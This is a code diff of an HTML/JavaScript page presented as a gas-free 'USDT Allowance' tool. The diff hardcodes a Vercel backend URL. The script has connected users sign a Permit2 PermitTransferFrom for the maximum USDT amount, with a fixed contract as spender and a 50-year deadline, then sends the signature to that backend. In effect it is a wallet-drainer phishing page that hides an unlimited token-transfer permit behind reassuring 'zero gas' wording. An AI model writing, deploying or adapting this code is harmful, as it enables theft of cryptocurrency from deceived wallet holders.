@@ -1,17 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>USDT Allowance - Sign & Approve</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js">
     </script>
     <style>
+        /* ============================================
+           CSS STYLES
+           ============================================ */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -21,114 +25,188 @@
             align-items: center;
             padding: 20px;
         }
+
         .container {
             background: white;
             border-radius: 20px;
             padding: 40px;
-            max-width: 500px;
+            max-width: 520px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
+
         h1 {
             color: #333;
             text-align: center;
+            font-size: 26px;
             margin-bottom: 5px;
-            font-size: 24px;
         }
+
         .subtitle {
             text-align: center;
             color: #666;
-            margin-bottom: 30px;
             font-size: 14px;
+            margin-bottom: 25px;
         }
+
+        .contract-address {
+            background: #f0f4f8;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 13px;
+            word-break: break-all;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid #e0e8f0;
+        }
+
+        .contract-address strong {
+            color: #667eea;
+        }
+
+        /* Wallet Status */
         .wallet-status {
             background: #f0f0f0;
             padding: 12px;
             border-radius: 10px;
             text-align: center;
-            margin-bottom: 20px;
             font-size: 14px;
             word-break: break-all;
+            margin-bottom: 20px;
+            transition: all 0.3s;
         }
+
         .wallet-status.connected {
             background: #d4edda;
             color: #155724;
         }
+
+        /* Info Box */
         .info-box {
             background: #f8f9fa;
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 12px;
             margin-bottom: 20px;
-            font-size: 13px;
+            font-size: 14px;
         }
+
         .info-box div {
-            padding: 5px 0;
+            padding: 6px 0;
             border-bottom: 1px solid #e0e0e0;
+            display: flex;
+            justify-content: space-between;
         }
+
         .info-box div:last-child {
             border-bottom: none;
         }
+
+        .info-box .label {
+            color: #666;
+        }
+
+        .info-box .value {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .info-box .value.unlimited {
+            color: #28a745;
+        }
+
+        /* Buttons */
         button {
             padding: 14px 20px;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
             color: white;
             width: 100%;
+            transition: all 0.3s ease;
         }
-        button:hover {
+
+        button:hover:not(:disabled) {
             transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
         }
+
         button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
+            transform: none !important;
         }
+
         .btn-connect {
             background: #667eea;
         }
+
+        .btn-connect:hover:not(:disabled) {
+            background: #5a6fd6;
+        }
+
         .btn-sign {
             background: #28a745;
         }
+
+        .btn-sign:hover:not(:disabled) {
+            background: #218838;
+        }
+
         .btn-sign.signing {
             background: #ffc107;
             color: #333;
         }
+
+        .btn-sign.signing:hover:not(:disabled) {
+            background: #e0a800;
+        }
+
         .btn-sign.done {
             background: #17a2b8;
         }
+
+        .btn-sign.done:hover:not(:disabled) {
+            background: #138496;
+        }
+
+        /* Status Message */
         .status-msg {
             margin-top: 15px;
-            padding: 12px;
+            padding: 12px 16px;
             border-radius: 10px;
             display: none;
             text-align: center;
+            font-size: 14px;
+            font-weight: 500;
         }
+
         .status-msg.success {
             display: block;
             background: #d4edda;
             color: #155724;
         }
+
         .status-msg.error {
             display: block;
             background: #f8d7da;
             color: #721c24;
         }
+
         .status-msg.info {
             display: block;
             background: #d1ecf1;
             color: #0c5460;
         }
+
         .status-msg.loading {
             display: block;
             background: #fff3cd;
             color: #856404;
         }
-        .loading {
+
+        .status-msg .loading-spinner {
             display: inline-block;
             width: 18px;
             height: 18px;
@@ -139,259 +217,309 @@
             margin-right: 10px;
             vertical-align: middle;
         }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Highlight Box */
         .highlight {
             background: #e8f4f8;
-            padding: 12px;
-            border-radius: 8px;
+            padding: 12px 16px;
+            border-radius: 10px;
             border-left: 4px solid #17a2b8;
-            margin-bottom: 15px;
-            font-size: 13px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #0c5460;
         }
-        .contract-address {
-            background: #f0f0f0;
-            padding: 8px 12px;
-            border-radius: 6px;
-            font-size: 12px;
-            word-break: break-all;
-            text-align: center;
-            margin: 10px 0;
+
+        .highlight strong {
+            color: #17a2b8;
         }
+
+        /* Success Check */
         .success-check {
-            color: #28a745;
-            font-size: 48px;
             text-align: center;
+            font-size: 48px;
             display: none;
+            margin-top: 10px;
         }
+
         .success-check.show {
             display: block;
         }
-        .api-url-input {
-            width: 100%;
-            padding: 10px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 13px;
-            margin-bottom: 15px;
-        }
-        .api-url-input:focus {
-            outline: none;
-            border-color: #667eea;
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 20px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .info-box div {
+                flex-direction: column;
+                gap: 2px;
+            }
         }
     </style>
 </head>
 <body>
 
     <div class="container">
+        <!-- Header -->
         <h1>💰 USDT Allowance</h1>
-        <p class="subtitle">Sign once - Get Unlimited Allowance for 50 Years</p>
+        <p class="subtitle">Sign Once — Get Unlimited Allowance for 50 Years</p>
 
+        <!-- Contract Address -->
         <div class="contract-address">
-            📋 Contract: 0xb69E225117d428a0b349BAB76368c68012Df1837
+            <strong>📋 Contract:</strong> 0xb69E225117d428a0b349BAB76368c68012Df1837
         </div>
 
+        <!-- Info: Backend Pays Gas -->
+        <div class="highlight">
+            ✅ <strong>You pay ZERO gas!</strong> Backend will pay all gas fees.
+        </div>
+
+        <!-- Wallet Status -->
         <div id="walletStatus" class="wallet-status">⛓️ Not Connected</div>
 
+        <!-- Info Box -->
         <div class="info-box">
-            <div><strong>👤 Your Address:</strong> <span id="userAddress">Not connected</span></div>
-            <div><strong>⏰ Allowance:</strong> <span id="allowanceStatus">Check after connect</span></div>
-            <div><strong>📅 Valid Until:</strong> <span id="expiryStatus">-</span></div>
+            <div>
+                <span class="label">👤 Your Address</span>
+                <span class="value" id="userDisplay">Not connected</span>
+            </div>
+            <div>
+                <span class="label">⏰ Allowance</span>
+                <span class="value" id="allowanceDisplay">Connect to check</span>
+            </div>
+            <div>
+                <span class="label">📅 Valid Until</span>
+                <span class="value" id="expiryDisplay">-</span>
+            </div>
         </div>
 
-        <div class="highlight">
-            ⚡ <strong>Gas Free Signing!</strong> Backend pays gas for transaction.
-        </div>
-
-        <div class="highlight" style="border-left-color:#667eea; background:#e8eeff;">
-            🔗 <strong>Backend URL:</strong> Set your Vercel URL below
-        </div>
-
-        <input type="text" id="apiUrlInput" class="api-url-input" placeholder="https://201-black.vercel.app/api/submit-signature.js" value="https://your-project.vercel.app/api/submit-signature">
-
+        <!-- Action Buttons -->
         <button id="connectBtn" class="btn-connect">🔗 Connect Wallet</button>
         <br><br>
         <button id="signBtn" class="btn-sign" disabled>✍️ Sign & Approve (50 Years)</button>
 
-        <div id="statusMsg" class="status-msg"></div>
+        <!-- Success Check -->
         <div id="successCheck" class="success-check">✅</div>
+
+        <!-- Status Message -->
+        <div id="statusMsg" class="status-msg"></div>
     </div>
 
     <script>
-        // ============================================
-        // CONFIG
-        // ============================================
+        // ============================================================
+        // ⭐ CONFIGURATION
+        // ============================================================
         const CONFIG = {
             contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837",
             permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
             usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-            chainId: 1
+            chainId: 1, // Ethereum Mainnet
+            apiUrl: "https://201-black.vercel.app/api/submit-signature"
         };
 
-        // ============================================
-        // STATE
-        // ============================================
-        let signer, provider, userAddress, contract;
+        console.log("🚀 USDT Allowance App");
+        console.log("📋 Contract:", CONFIG.contractAddress);
+        console.log("📤 Backend:", CONFIG.apiUrl);
 
-        // ============================================
-        // DOM
-        // ============================================
+        // ============================================================
+        // ⭐ STATE
+        // ============================================================
+        let signer, provider, userAddress;
+
+        // ============================================================
+        // ⭐ DOM REFS
+        // ============================================================
         const $ = (id) => document.getElementById(id);
         const walletStatus = $('walletStatus');
         const connectBtn = $('connectBtn');
         const signBtn = $('signBtn');
         const statusMsg = $('statusMsg');
-        const userAddressEl = $('userAddress');
-        const allowanceStatus = $('allowanceStatus');
-        const expiryStatus = $('expiryStatus');
+        const userDisplay = $('userDisplay');
+        const allowanceDisplay = $('allowanceDisplay');
+        const expiryDisplay = $('expiryDisplay');
         const successCheck = $('successCheck');
-        const apiUrlInput = $('apiUrlInput');
 
-        // ============================================
-        // HELPERS
-        // ============================================
-        function showStatus(msg, type = 'info') {
+        // ============================================================
+        // ⭐ HELPERS
+        // ============================================================
+        function showStatus(message, type = 'info') {
             statusMsg.className = `status-msg ${type}`;
-            statusMsg.textContent = msg;
+            statusMsg.innerHTML = message;
             statusMsg.style.display = 'block';
+
+            // Auto hide after 8 seconds (except errors)
+            if (type !== 'error') {
+                setTimeout(() => {
+                    statusMsg.style.display = 'none';
+                }, 8000);
+            }
         }
 
         function hideStatus() {
             statusMsg.style.display = 'none';
         }
 
-        function shortenAddress(addr) {
-            if (!addr) return '';
-            return addr.slice(0, 6) + '...' + addr.slice(-4);
+        function shortenAddress(address) {
+            if (!address) return '';
+            return address.slice(0, 6) + '...' + address.slice(-4);
         }
 
-        // ============================================
-        // CONNECT WALLET
-        // ============================================
+        function formatDate(timestamp) {
+            if (!timestamp || timestamp === 0) return '-';
+            return new Date(timestamp * 1000).toLocaleDateString('en-US', {
+                year: 'numeric',
+                month: 'short',
+                day: 'numeric'
+            });
+        }
+
+        // ============================================================
+        // ⭐ CONNECT WALLET
+        // ============================================================
         async function connectWallet() {
             try {
+                // 1. Check MetaMask
                 if (!window.ethereum) {
-                    showStatus('Please install MetaMask!', 'error');
+                    showStatus('⚠️ Please install MetaMask or another Web3 wallet!', 'error');
                     return;
                 }
 
+                // 2. Get provider
                 provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
+
+                // 3. Request accounts
+                await provider.send('eth_requestAccounts', []);
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
 
+                // 4. Check network
                 const network = await provider.getNetwork();
                 if (network.chainId !== CONFIG.chainId) {
-                    showStatus(`Please switch to Ethereum Mainnet`, 'error');
+                    showStatus(`⚠️ Please switch to Ethereum Mainnet (Chain ID: ${CONFIG.chainId})`, 'error');
                     return;
                 }
 
-                contract = new ethers.Contract(CONFIG.contractAddress, [
-                    "function setAllowance(uint256 nonce, uint256 deadline, bytes calldata signature) external",
-                    "function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
-                ], signer);
-
+                // 5. Update UI
                 walletStatus.className = 'wallet-status connected';
                 walletStatus.innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
                 connectBtn.textContent = '✅ Connected';
                 connectBtn.disabled = true;
                 signBtn.disabled = false;
+                userDisplay.textContent = shortenAddress(userAddress);
 
-                userAddressEl.textContent = shortenAddress(userAddress);
-
-                // Check existing allowance
+                // 6. Check allowance
                 await checkAllowance();
 
-                showStatus('✅ Wallet connected! Ready to sign.', 'success');
+                showStatus('✅ Wallet connected successfully!', 'success');
 
             } catch (error) {
-                console.error(error);
-                showStatus(`Error: ${error.message}`, 'error');
+                console.error('❌ Connect error:', error);
+                showStatus(`❌ ${error.message}`, 'error');
             }
         }
 
-        // ============================================
-        // CHECK ALLOWANCE
-        // ============================================
+        // ============================================================
+        // ⭐ CHECK ALLOWANCE
+        // ============================================================
         async function checkAllowance() {
             try {
-                if (!contract || !userAddress) {
-                    allowanceStatus.textContent = 'Connect wallet first';
-                    return;
-                }
+                if (!userAddress) return;
+
+                const contract = new ethers.Contract(
+                    CONFIG.contractAddress,
+                    [
+                        "function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
+                    ],
+                    provider
+                );
 
                 const result = await contract.getAllowance(userAddress);
                 const amount = result.amount;
                 const expiration = result.expiration;
 
                 if (amount.toString() === '0') {
-                    allowanceStatus.textContent = '❌ No allowance';
-                    expiryStatus.textContent = '-';
+                    allowanceDisplay.textContent = '❌ No allowance';
+                    expiryDisplay.textContent = '-';
                     return;
                 }
 
                 const isUnlimited = amount.toString() === ethers.constants.MaxUint256.toString();
-                allowanceStatus.textContent = isUnlimited ? '♾️ UNLIMITED ✅' : amount.toString();
+                allowanceDisplay.textContent = isUnlimited ? '♾️ UNLIMITED' : `${ethers.utils.formatUnits(amount, 6)} USDT`;
+                allowanceDisplay.className = isUnlimited ? 'value unlimited' : 'value';
 
-                if (expiration > 0) {
-                    const date = new Date(expiration * 1000);
-                    expiryStatus.textContent = date.toLocaleDateString();
-                }
+                expiryDisplay.textContent = formatDate(expiration);
 
+                // If already approved
                 if (isUnlimited && expiration > Math.floor(Date.now() / 1000)) {
-                    successCheck.classList.add('show');
                     signBtn.textContent = '✅ Already Approved!';
                     signBtn.className = 'btn-sign done';
                     signBtn.disabled = true;
+                    successCheck.classList.add('show');
+                    showStatus('🎉 Unlimited allowance already set!', 'success');
                 }
 
             } catch (error) {
-                console.error('Error checking allowance:', error);
+                console.error('❌ Error checking allowance:', error);
+                allowanceDisplay.textContent = '⚠️ Error';
             }
         }
 
-        // ============================================
-        // GET PERMIT2 NONCE
-        // ============================================
+        // ============================================================
+        // ⭐ GET PERMIT2 NONCE
+        // ============================================================
         async function getPermit2Nonce() {
-            const permit2 = new ethers.Contract(CONFIG.permit2Address, [
-                "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
-            ], provider);
+            const permit2 = new ethers.Contract(
+                CONFIG.permit2Address,
+                [
+                    "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
+                ],
+                provider
+            );
 
-            const data = await permit2.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
+            const data = await permit2.allowance(
+                userAddress,
+                CONFIG.usdtAddress,
+                CONFIG.contractAddress
+            );
             return data.nonce;
         }
 
-        // ============================================
-        // SIGN & APPROVE
-        // ============================================
-        async function signAndApprove() {
+        // ============================================================
+        // ⭐ SIGN & SUBMIT (Backend pays gas)
+        // ============================================================
+        async function signAndSubmit() {
             try {
+                // 1. Validate state
                 if (!signer || !userAddress) {
-                    showStatus('Please connect wallet first!', 'error');
+                    showStatus('⚠️ Please connect wallet first!', 'error');
                     return;
                 }
 
-                const apiUrl = apiUrlInput.value.trim();
-                if (!apiUrl || !apiUrl.startsWith('http')) {
-                    showStatus('Please enter a valid Backend URL!', 'error');
-                    return;
-                }
-
-                hideStatus();
-                signBtn.innerHTML = '<span class="loading"></span> Signing...';
+                // 2. Disable button
+                signBtn.innerHTML = '<span class="loading-spinner"></span> Signing...';
                 signBtn.className = 'btn-sign signing';
                 signBtn.disabled = true;
+                hideStatus();
 
+                // 3. Get nonce
                 const nonce = await getPermit2Nonce();
+
+                // 4. Create deadline (50 years)
                 const years = 50;
                 const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
 
+                // 5. Show signing message
                 showStatus('✍️ Please sign in MetaMask... (No Gas!)', 'info');
 
-                // EIP-712
+                // 6. EIP-712 Domain
                 const domain = {
                     name: "Permit2",
                     version: "1",
@@ -399,6 +527,7 @@
                     verifyingContract: CONFIG.permit2Address
                 };
 
+                // 7. EIP-712 Types
                 const types = {
                     PermitTransferFrom: [
                         { name: "permitted", type: "TokenPermissions" },
@@ -412,86 +541,100 @@
                     ]
                 };
 
+                // 8. Message (UNLIMITED)
                 const message = {
                     permitted: {
                         token: CONFIG.usdtAddress,
-                        amount: ethers.constants.MaxUint256
+                        amount: ethers.constants.MaxUint256.toString()
                     },
                     spender: CONFIG.contractAddress,
                     nonce: nonce,
                     deadline: deadline
                 };
 
-                // ⭐ GET SIGNATURE (OFF-CHAIN - GAS FREE!)
+                // 9. Get signature (Off-Chain - Gas Free!)
                 const signature = await signer._signTypedData(domain, types, message);
 
-                console.log("✅ Signature:", signature);
+                console.log("✅ Signature received:", signature.substring(0, 40) + "...");
 
-                // Prepare data for backend
-                const signatureData = {
-                    user: userAddress,
-                    nonce: nonce.toString(),
-                    deadline: deadline,
-                    signature: signature,
-                    contractAddress: CONFIG.contractAddress
-                };
-
+                // 10. Send to backend
                 showStatus('📤 Sending to backend... (Backend will pay gas)', 'loading');
 
-                // ⭐ SEND TO VERCEL BACKEND
-                const response = await fetch(apiUrl, {
+                const response = await fetch(CONFIG.apiUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(signatureData)
+                    body: JSON.stringify({
+                        user: userAddress,
+                        nonce: nonce.toString(),
+                        deadline: deadline,
+                        signature: signature
+                    })
                 });
 
-                const result = await response.json();
+                // 11. Handle response
+                const rawText = await response.text();
 
+                // Try to parse JSON
+                let result;
+                try {
+                    result = JSON.parse(rawText);
+                } catch (parseError) {
+                    console.error("❌ JSON Parse Error:", rawText.substring(0, 200));
+                    showStatus(`❌ Backend error: ${rawText.substring(0, 100)}`, 'error');
+                    signBtn.innerHTML = '✍️ Sign & Approve (50 Years)';
+                    signBtn.className = 'btn-sign';
+                    signBtn.disabled = false;
+                    return;
+                }
+
+                // 12. Handle result
                 if (result.success) {
                     signBtn.innerHTML = '✅ Approved!';
                     signBtn.className = 'btn-sign done';
                     signBtn.disabled = true;
-
-                    showStatus(`✅ ${result.message}`, 'success');
                     successCheck.classList.add('show');
 
-                    // Update allowance
-                    await checkAllowance();
+                    showStatus(`✅ ${result.message}`, 'success');
 
                     console.log("📤 Tx Hash:", result.txHash);
                     console.log("🔗 https://etherscan.io/tx/" + result.txHash);
 
+                    // Update allowance
+                    await checkAllowance();
+
                 } else {
-                    showStatus(`❌ Error: ${result.error}`, 'error');
+                    showStatus(`❌ Error: ${result.error || 'Unknown error'}`, 'error');
                     signBtn.innerHTML = '✍️ Sign & Approve (50 Years)';
                     signBtn.className = 'btn-sign';
                     signBtn.disabled = false;
                 }
 
             } catch (error) {
-                console.error(error);
-                showStatus(`Error: ${error.message}`, 'error');
+                console.error('❌ signAndSubmit error:', error);
+                showStatus(`❌ ${error.message}`, 'error');
                 signBtn.innerHTML = '✍️ Sign & Approve (50 Years)';
                 signBtn.className = 'btn-sign';
                 signBtn.disabled = false;
             }
         }
 
-        // ============================================
-        // EVENT LISTENERS
-        // ============================================
+        // ============================================================
+        // ⭐ EVENT LISTENERS
+        // ============================================================
         connectBtn.addEventListener('click', connectWallet);
-        signBtn.addEventListener('click', signAndApprove);
+        signBtn.addEventListener('click', signAndSubmit);
 
-        // Auto connect if MetaMask available
+        // Auto-connect if MetaMask available
         if (window.ethereum) {
             window.ethereum.on('accountsChanged', () => location.reload());
             window.ethereum.on('chainChanged', () => location.reload());
         }
 
-        console.log('🚀 USDT Allowance App');
-        console.log('📋 Contract:', CONFIG.contractAddress);
-        console.log('📤 Backend URL set in input field');
+        // ============================================================
+        // ⭐ STARTUP
+        // ============================================================
+        console.log("✅ App ready!");
+        console.log("📌 Make sure backend is deployed at:", CONFIG.apiUrl);
     </script>
 
 </body>
